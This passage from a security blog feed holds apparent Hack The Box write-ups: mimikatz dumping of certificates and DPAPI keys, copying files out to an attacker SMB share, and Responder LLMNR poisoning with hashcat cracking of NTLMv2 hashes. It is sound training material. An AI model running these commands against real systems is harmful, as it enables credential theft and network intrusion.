[0014/1] KEY_IDENTIFIER_PROP_ID
  099fe2755e60803bd24e62c8d2fb34b665bc86ff
[005c/1] SUBJECT_PUB_KEY_BIT_LENGTH_PROP_ID
  00080000
[0020/1] cert_file_element
  Data: 3082030e308201f6a00302010202105fd12ffe9a3896b64ed854b008ea54e8300d06092a864886f70d01010505003018311630140603550403130d41646d696e6973747261746f723020170d3139303431343139313034375a180f32313139303332313139313034375a3018311630140603550403130d41646d696e6973747261746f7230820122300d06092a864886f70d01010105000382010f003082010a0282010100ca2f8b2110d3e8bcfdbf18736f83b95d6418253cc64ee89e2a8ca6ebd0b489324adc94096203cbbec84b748484ee61b0774a5e344cf740a40c85f8fbdbe401e19d5f06b9c00dc6ded1016daba2ab1285436e43ec32a3fd123e92d1c7b89bc81af763db864a2854c362a906bec9803419b701896f63f3fc8b3f3cc2f55cfb8f4c73952fef088fb89560edf842864dd1c690af89ee7793e272ff1451d5227e1cebb2b050beb6498c92a6c7433ff51cd7e489250abbd6d9804cc8920026759e54959bf24f342e65108d709f273f963bc0134f082ebc116948990286299faf7c742baf9014d19c987d0c672e12eec63212f6057ea139d8a6496e6eafbc19232d80a50203010001a352305030150603551d25040e300c060a2b0601040182370a0304302c0603551d1104253023a021060a2b060104018237140203a0130c1141646d696e6973747261746f724052450030090603551d1304023000300d06092a864886f70d01010505000382010100c7a44d7d3b91b94bae6719fe813d6e26592504d827b41d5a98adb2957a4ff4e0d978e87a5b5eb04e43ffd14ab1c2b8dfff70f0d3a975a3e0dfec9aea46d870f5dfe64012ff3b5e81126acb1434ab3a60af80dc7e88718ea6b2a0a71a45b297ce0e1a759769a253aca4dd2bee3ce97a691b0bacb8ea10543a8ce03fc74d1f03cc1449c5973153433751adee8a9a9e3d2f339cd3deda048fa0ddbbfe3f79a3137026034b5dce733a1c9e4ae960db73c55c08dda5b5abb5e17f4912918f1ea95e946cf19c54279de2e32e50ded56a86a580566ce013325a35dd31b819c91ad0e40e50aef70cd78fdce68de9e4161169f1ed9da0e2932aade7bebb6e8601b03b97ff
  Saved to file: E0885900BE2019BE6224E5DE3D97E3B4FD91C95D.der


mimikatz(commandline) # exit
Bye!
</code></pre>
<p>We need to download this *.der certificate, so we will use <a href="https://github.com/SecureAuthCorp/impacket">python-impacket</a> to create a samba share on our linux machine. Our smbserver will run locally on port 8045 that we will forward to 10.10.14.73:445 with <code>ssh username@localhost -L 10.10.14.73:445:192.168.99.100:8045</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">virtualenv -p /usr/bin/python3 v3
. ./v3/bin/activate
pip install impacket
whereis smbserver.py
<span style="color:#6272a4">#smbserver: /home/ctf/htb/v3/bin/smbserver.py</span>
/home/ctf/htb/v3/bin/smbserver.py -smb2support -username <span style="color:#8be9fd;font-style:italic">test</span> -password <span style="color:#8be9fd;font-style:italic">test</span> -port <span style="color:#bd93f9">8045</span> <span style="color:#8be9fd;font-style:italic">test</span> <span style="color:#ff79c6">$(</span><span style="color:#8be9fd;font-style:italic">pwd</span><span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>Now we have Let&rsquo;s map our samba share with Z: and upload the certificate</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">PS </span>C:\users\administrator\music&gt; net use z: \\10.10.14.73\test /user:test test
The command completed successfully.
</code></pre></td></tr></table>
</div>
</div><p>We can observe the connection upon mapping with letter Z: and the file is well copied</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">(v3) ./smbserver.py -username test -password test -smb2support test $(pwd)
</code></pre></td></tr></table>
</div>
</div><p>output:</p>
<pre><code>Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.144,49792)
[*] AUTHENTICATE_MESSAGE (\test,RE)
[*] User RE\test authenticated successfully
[*] test:::4141414141414141:7f33ca59879d25e91db14dcaea7e012b:010100000000000080390d7f99e4d501a9ac49f1dfaac64c000000000100100065004f004d006900670069004b0043000300100065004f004d006900670069004b004300020010005800440059006700730072004b006500040010005800440059006700730072004b0065000700080080390d7f99e4d50106000400020000000800300030000000000000000000000000400000a937185f9d8be12dc1461140265eb6ca543bfbfe1765cefb7733fcc5d6bf30d40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0037003300000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:test)
[*] AUTHENTICATE_MESSAGE (RE\coby,RE)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (RE\coby,RE)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (RE\coby,RE)
[*] Could not authenticate user!
[*] Disconnecting Share(1:IPC$)
</code></pre>
<h1 id="getting-the-private-key">Getting the private key</h1>
<p>There is 3 keys:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">PS </span>C:\users\administrator\appdata\roaming\microsoft\crypto\rsa\S-1-5-21-311800348-2366743891-1978325779-500&gt; <span style="color:#8be9fd;font-style:italic">ls
</span><span style="color:#8be9fd;font-style:italic"></span>

    Directory: C:\users\administrator\appdata\roaming\microsoft\crypto\rsa\S-1-5-21-311800348-2366743891-1978325779-500


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a--s-        4/14/2019  12:10 PM           2249 319aa04d0663b8fba89e3b1849e46826_48353c3a-6eb0-4444-b39d-ba4c0dae6ffd
-a--s-        3/14/2019  10:31 AM             45 83aa4cc77f591dfc2374580bbd95f6ba_48353c3a-6eb0-4444-b39d-ba4c0dae6ffd
-a--s-        3/13/2019   6:41 PM             54 a18ca4003deb042bbee7a40f15e1970b_48353c3a-6eb0-4444-b39d-ba4c0dae6ffd
</code></pre></td></tr></table>
</div>
</div><p>We need to test each of them</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">./mimikatz.exe <span style="color:#f1fa8c">&#34;dpapi::capi /in:C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-311800348-2366743891-1978325779-500\319aa04d0663b8fba89e3b1849e46826_48353c3a-6eb0-4444-b39d-ba4c0dae6ffd&#34;</span> <span style="color:#f1fa8c">&#34;exit&#34;</span>
    guidMasterKey      : {41887edc-651d-4ef3-b4fe-f6ed128923c2}
./mimikatz.exe <span style="color:#f1fa8c">&#34;dpapi::capi /in:C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-311800348-2366743891-1978325779-500\83aa4cc77f591dfc2374580bbd95f6ba_48353c3a-6eb0-4444-b39d-ba4c0dae6ff&#34;</span> <span style="color:#f1fa8c">&#34;exit&#34;</span>
**KEY (capi)**
  dwVersion          : 00000002 - 2
  dwUniqueNameLen    : 00000005 - 5
  dwSiPublicKeyLen   : 00000000 - 0
  dwSiPrivateKeyLen  : 00000000 - 0
  dwExPublicKeyLen   : 00000000 - 0
  dwExPrivateKeyLen  : 00000000 - 0
  dwHashLen          : 00000000 - 0
  dwSiExportFlagLen  : 00000000 - 0
  dwExExportFlagLen  : 00000000 - 0
  pUniqueName        : J2SE
  pHash              :
  pSiPublicKey       :
  pSiPrivateKey      :
  pSiExportFlag      :
  pExPublicKey       :
  pExPrivateKey      :
  pExExportFlag      :

mimikatz(commandline) # exit
Bye!

./mimikatz.exe <span style="color:#f1fa8c">&#34;dpapi::capi /in:C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-311800348-2366743891-1978325779-500\a18ca4003deb042bbee7a40f15e1970b_48353c3a-6eb0-4444-b39d-ba4c0dae6ffd&#34;</span> <span style="color:#f1fa8c">&#34;exit&#34;</span>
**KEY (capi)**
  dwVersion          : 00000002 - 2
  dwUniqueNameLen    : 0000000e - 14
  dwSiPublicKeyLen   : 00000000 - 0
  dwSiPrivateKeyLen  : 00000000 - 0
  dwExPublicKeyLen   : 00000000 - 0
  dwExPrivateKeyLen  : 00000000 - 0
  dwHashLen          : 00000000 - 0
  dwSiExportFlagLen  : 00000000 - 0
  dwExExportFlagLen  : 00000000 - 0
  pUniqueName        : Administrator
  pHash              :
  pSiPublicKey       :
  pSiPrivateKey      :
  pSiExportFlag      :
  pExPublicKey       :
  pExPrivateKey      :
  pExExportFlag      :

mimikatz(commandline) # exit
Bye!
</code></pre></td></tr></table>
</div>
</div><p>So now we the private key is encrypted with the master key: <code>{41887edc-651d-4ef3-b4fe-f6ed128923c2}</code></p>
<p>refer to mimkatz resources: <a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files">https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files</a></p>
<h1 id="could-not-complete-the-above-part">COULD NOT COMPLETE THE ABOVE PART</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">./mimikatz.exe <span style="color:#f1fa8c">&#34;dpapi::masterkey /in:C:\Users\Coby\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-311800348-2366743891-1978325779-500\a18ca4003deb042bbee7a40f15e1970b_48353c3a-6eb0-4444-b39d-ba4c0dae6ffd&#34;</span> <span style="color:#f1fa8c">&#34;exit&#34;</span>
dpapi::masterkey /in:<span style="color:#f1fa8c">&#34;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Protect\S-1-5-21-494464150-3436831043-1864828003-1001\1eccdbd2-4771-4360-8b19-9d6060a061dc&#34;</span> /password:waza1234/

PS C:\users\administrator\music&gt; ls ../../Coby/Appdata/Roaming/Microsoft/Crypto/RSA/S-1-5-21-311800348-2366743891-1978325779-1000

    Directory: C:\users\Coby\Appdata\Roaming\Microsoft\Crypto\RSA\S-1-5-21-311800348-2366743891-1978325779-1000

Mode LastWriteTime Length Name

---

-a--s- 4/14/2019 12:07 PM 2249 04f8fa25d3e81af8ba7754cd439e0a7d_48353c3a-6eb0-4444-b39d-ba4c0dae6ffd
-a--s- 3/27/2019 1:50 PM 45 7bbab6199a4fc38a78bbb04442b626f3_48353c3a-6eb0-4444-b39d-ba4c0dae6ffd
-a--s- 3/14/2019 10:48 AM 45 83aa4cc77f591dfc2374580bbd95f6ba_48353c3a-6eb0-4444-b39d-ba4c0dae6ffd

PS C:\users\administrator\music&gt; ./mimikatz.exe <span style="color:#f1fa8c">&#34;dpapi::capi /in:C:\Users\Coby\Appdata\Roaming\Microsoft\Crypto\RSA\S-1-5-21-311800348-2366743891-1978325779-1000\04f8fa25d3e81af8ba7754cd439e0a7d_48353c3a-6eb0-4444-b39d-ba4c0dae6ffd&#34;</span> <span style="color:#f1fa8c">&#34;exit&#34;</span>

    guidMasterKey      : {af427980-60ef-4bcb-a3b1-f56fd2bb9eba}
</code></pre></td></tr></table>
</div>
</div><h1 id="kill-process-mimikatz">Kill process mimikatz</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">PS C:\users\administrator\music&gt; tasklist /v | findstr mimik
mimikatz.exe 6808 Services 0 8,424 K Unknown NT AUTHORITY\SYSTEM 0:00:00 N/A
PS C:\users\administrator\music&gt; taskkill /f /im:mimikatz.exe
SUCCESS: The process <span style="color:#f1fa8c">&#34;mimikatz.exe&#34;</span> with PID 6808 has been terminated.
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>Responder</title><link>https://0xade1.github.io/posts/2020/05/responder/</link><pubDate>Tue, 05 May 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/05/responder/</guid><description>what is responder Responder is basically a lyer or a poisoner &amp;hellip; there is a ton of broadcasted or multicast messages on the network such as those protocols:
LLMNR - Link-Local Multicast Name Resolution [NBT-NS - NetBIOS Name Service] [mDNS] When those resolution protocols broadcast the network asking &amp;ldquo;Where is machine A?&amp;rdquo;, responder will pretend &amp;ldquo;Hey, it&amp;rsquo;s me!&amp;rdquo; and the remote machine will starts to talk with responder sharing some windows hashes and otherthings that can be:</description><content type="html"><![CDATA[<h1 id="what-is-responder">what is responder</h1>
<p><a href="https://github.com/SpiderLabs/Responder">Responder</a> is basically a lyer or a poisoner &hellip; there is a ton of broadcasted or multicast messages on the network such as those protocols:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution">LLMNR - Link-Local Multicast Name Resolution</a></li>
<li>[NBT-NS - NetBIOS Name Service]</li>
<li>[mDNS]</li>
</ul>
<p>When those resolution protocols broadcast the network asking &ldquo;Where is machine A?&rdquo;, responder will pretend &ldquo;Hey, it&rsquo;s me!&rdquo; and the remote machine will starts to talk with responder sharing some windows hashes and otherthings that can be:</p>
<ul>
<li>cracked offline</li>
<li>relayed to other hosts</li>
</ul>
<h1 id="using-responder-to-capture-domain-hashes">Using Responder to capture domain hashes</h1>
<p>On an engagement, the best time is when there is a lot of user traffic, such as in the morning or when users are back from lunch.</p>
<pre><code>sudo Responder.py -I eth0 -w -F
</code></pre>
<p>Once hashes captured, we can visit the Responder/logs/*txt files which contains multiple occurrences of <code>username::DOMAIN::hash</code> where the hash may differ because of different salts but it is basically the same password hash.</p>
<p>Then we simply dump those hashes for hashcat (GPU recommended):</p>
<pre><code>cat Responder/logs/*txt &gt; ~/hashes.txt
hashcat -m 5600  ~/hashes.txt ~/passwords_dictionary.txt -o ~/cracked.txt --force
</code></pre>
<p>5600 stands for NTLMv2 hashes. &ndash;force is because we don&rsquo;t have GPU</p>
<h1 id="installation">Installation</h1>
<p>My docker environment do not have access to utun4
<a href="https://tools.kali.org/sniffingspoofing/responder">Kali Responder</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/lgandx/Responder.git
<span style="color:#8be9fd;font-style:italic">cd</span> Responder
sudo python Responder.py -i 10.10.14.73 -wrf
<span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Listening <span style="color:#ff79c6">for</span> events...
</code></pre></td></tr></table>
</div>
</div><p>Then from the victim side, we use powershell to attempt collecting the password hash of the current user:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">Get-Content</span> \\10.10.14.73\randomFileName
</code></pre></td></tr></table>
</div>
</div><p>Responder will intercept the following hash</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Listening <span style="color:#ff79c6">for</span> events...

<span style="color:#ff79c6">[</span>SMB<span style="color:#ff79c6">]</span> NTLMv2-SSP Client   : 10.10.10.144
<span style="color:#ff79c6">[</span>SMB<span style="color:#ff79c6">]</span> NTLMv2-SSP Username : RE<span style="color:#f1fa8c">\l</span>uke
